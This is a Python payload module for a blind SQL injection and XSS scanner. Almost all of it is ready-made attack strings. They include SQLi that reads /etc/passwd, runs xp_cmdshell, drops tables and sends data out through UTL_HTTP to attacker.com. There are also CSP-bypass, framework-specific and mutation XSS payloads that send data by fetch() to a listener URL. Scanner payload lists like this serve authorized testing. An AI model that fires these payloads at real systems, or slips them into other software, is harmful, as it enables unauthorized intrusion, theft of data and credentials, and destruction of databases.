"""
Payload module for Blind SQLi and XSS testing.

Includes:
- Boolean and time-based SQLi payloads
- Advanced bypass techniques (JSON, Unicode, CSP, framework-specific)
"""

from .payload_engine import BOOLEAN_PAIRS, TIME_BASED

# =============================================================================
# Basic SQLi Payloads
# =============================================================================

def boolean_payloads():
    return [{'true': t, 'false': f} for t, f in BOOLEAN_PAIRS]

def time_payloads(delay=5):
    return [{'db': db, 'payload': tpl.format(delay=delay)} for db, tpl in TIME_BASED]


# =============================================================================
# Advanced SQLi Bypass Payloads
# =============================================================================

def json_sqli_payloads():
    """
    JSON-based SQLi payloads for modern APIs.
    Targets: MongoDB-style queries, JSON columns in SQL databases
    """
    return [
        # MongoDB NoSQL injection
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        
        # JSON column injection (PostgreSQL, MySQL 5.7+)
        '\' OR JSON_EXTRACT(data, "$.admin") = true--',
        '\' OR data->>"$.role" = "admin"--',
        
        # JSON array injection
        '["admin", "user"]',
        '[1, 2, 3, 999 OR 1=1]',
    ]


def unicode_comment_sqli():
    """
    Unicode comment injection to bypass WAFs.
    Uses Unicode characters that normalize to SQL comments.
    """
    return [
        # Unicode normalization tricks
        "' OR 1=1\u002d\u002d",  # U+002D (HYPHEN-MINUS) normalizes to --
        "' OR 1=1\u2010\u2010",  # U+2010 (HYPHEN) 
        "' OR '1'='1\u00a0\u002d\u002d",  # U+00A0 (NO-BREAK SPACE)
        
        # Unicode slash injection
        "' OR 1=1\u002f\u002a",  # U+002F + U+002A = /*
        
        # Mixed encoding
        "' OR 1=1%u002d%u002d",  # URL-encoded Unicode
    ]


def subquery_time_sqli(delay: int = 5):
    """
    Time-based SQLi inside subqueries (bypasses some regex filters).
    """
    mssql = [
        f"' AND 1=(SELECT 1 FROM (SELECT SLEEP({delay})) AS x)--",
        f"' OR EXISTS(SELECT * FROM (SELECT SLEEP({delay})) AS t)--",
    ]
    
    mysql = [
        f"' AND (SELECT SLEEP({delay}) FROM dual)--",
        f"' OR (SELECT COUNT(*) FROM (SELECT SLEEP({delay})) AS t)>0--",
    ]
    
    postgresql = [
        f"' AND 1=(SELECT 1 FROM pg_sleep({delay}))--",
        f"' OR EXISTS(SELECT pg_sleep({delay}))--",
    ]
    
    return {
        "mssql": mssql,
        "mysql": mysql,
        "postgresql": postgresql,
    }


def db_specific_advanced():
    """
    Database-specific advanced techniques.
    """
    return {
        "mysql": [
            # IF inside SLEEP
            "' AND SLEEP(IF(1=1, 5, 0))--",
            "' OR SLEEP(IF(SUBSTRING(VERSION(),1,1)='5', 5, 0))--",
            
            # BENCHMARK (CPU-based timing)
            "' AND BENCHMARK(5000000, MD5('a'))--",
            
            # LOAD_FILE exfiltration
            "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        ],
        
        "mssql": [
            # WAITFOR with dynamic delay
            "' WAITFOR DELAY '00:00:0'+CAST((SELECT TOP 1 LEN(name) FROM sys.tables) AS VARCHAR)--",
            
            # xp_cmdshell (requires elevated privileges)
            "'; EXEC xp_cmdshell 'ping attacker.com'--",
            
            # Stacked queries
            "'; DROP TABLE temp_audit--",
        ],
        
        "postgresql": [
            # pg_sleep with conditional
            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)--",
            
            # COPY TO exfiltration
            "'; COPY (SELECT * FROM users) TO '/tmp/out.txt'--",
        ],
        
        "oracle": [
            # DBMS_LOCK.SLEEP
            "' AND DBMS_LOCK.SLEEP(5)--",
            
            # UTL_HTTP exfiltration
            "' OR UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version)) IS NOT NULL--",
        ],
    }


# =============================================================================
# XSS Advanced Bypass Payloads
# =============================================================================

def csp_bypass_payloads(listener_url: str, uuid: str):
    """
    CSP (Content Security Policy) bypass techniques.
    Works when CSP blocks inline scripts but allows certain sources.
    """
    return [
        # JSONP callback hijacking (bypasses script-src restrictions)
        f'<script src="https://ajax.googleapis.com/ajax/services/search/web?v=1.0&callback=fetch(`{listener_url}?id={uuid}`)"></script>',
        
        # AngularJS sandbox escape (CSP unsafe-eval required)
        f'<div ng-app ng-csp>{{{{constructor.constructor(\'fetch("{listener_url}?id={uuid}")\')()}}}}</div>',
        
        # Base href abuse (redirects relative URLs)
        f'<base href="{listener_url}?id={uuid}">',
        
        # Link prefetch (DNS callback)
        f'<link rel="prefetch" href="{listener_url}/x.js?id={uuid}">',
        f'<link rel="dns-prefetch" href="{listener_url}">',
        
        # Meta refresh (bypasses script-src)
        f'<meta http-equiv="refresh" content="0;url={listener_url}?id={uuid}">',
        
        # SVG-based XSS
        f'<svg><use href="{listener_url}/x.svg?id={uuid}"></use></svg>',
        
        # Iframe with srcdoc (inline HTML)
        f'<iframe srcdoc="<script src=\\"{listener_url}/x.js?id={uuid}\\"></script>"></iframe>',
    ]


def angular_react_context_payloads(listener_url: str, uuid: str):
    """
    Framework-specific XSS payloads for Angular/React applications.
    """
    angular = [
        # AngularJS expression injection
        f'{{{{constructor.constructor(\'location="{listener_url}?id={uuid}"\')()}}}}',
        
        # ng-include
        f'<div ng-include=\'"{listener_url}/x.html?id={uuid}"\'>',
        
        # $eval injection
        f'{{{{$eval("fetch(\'{listener_url}?id={uuid}\')")}}}}',
    ]
    
    react = [
        # dangerouslySetInnerHTML bypass
        f'<img src=x onerror="fetch(\'{listener_url}?id={uuid}\')">',
        
        # href javascript: (if sanitizer allows)
        f'<a href="javascript:fetch(\'{listener_url}?id={uuid}\')">Click</a>',
        
        # style attribute with expression
        f'<div style="background:url(\'{listener_url}/x.css?id={uuid}\')"></div>',
    ]
    
    vue = [
        # v-html bypass
        f'<div v-html="\'<img src=x onerror=fetch(\\\'{listener_url}?id={uuid}\\\')>\'"></div>',
        
        # Expression injection
        f'{{{{fetch(\'{listener_url}?id={uuid}\')}}}}',
    ]
    
    return {
        "angular": angular,
        "react": react,
        "vue": vue,
    }


def uuid_in_path_payloads(listener_url: str, uuid: str):
    """
    Mutation: embed UUID in URL path instead of query parameter.
    Bypasses query string filters.
    """
    base = listener_url.rstrip('/')
    return [
        f'<script src="{base}/{uuid}/x.js"></script>',
        f'<img src="{base}/{uuid}/pixel.gif" onerror="void(0)">',
        f'<link rel="stylesheet" href="{base}/{uuid}/style.css">',
        f'<iframe src="{base}/{uuid}/frame.html"></iframe>',
    ]


def mutation_fuzzing_payloads(listener_url: str, uuid: str):
    """
    DOM mutation fuzzing payloads (trigger mXSS - mutation XSS).
    """
    return [
        # mXSS via backticks
        f'<noscript><p title="</noscript><img src=x onerror=fetch(`{listener_url}?id={uuid}`)>">',
        
        # mXSS via HTML entities
        f'<a href="&Tab;javascript:fetch(\'{listener_url}?id={uuid}\')">Click</a>',
        
        # mXSS via namespace confusion
        f'<svg><style><![CDATA[</style><img src=x onerror="fetch(\'{listener_url}?id={uuid}\')">]]></svg>',
        
        # Form hijacking
        f'<form action="{listener_url}?id={uuid}" method="GET"><input name="data" value="stolen"></form>',
    ]
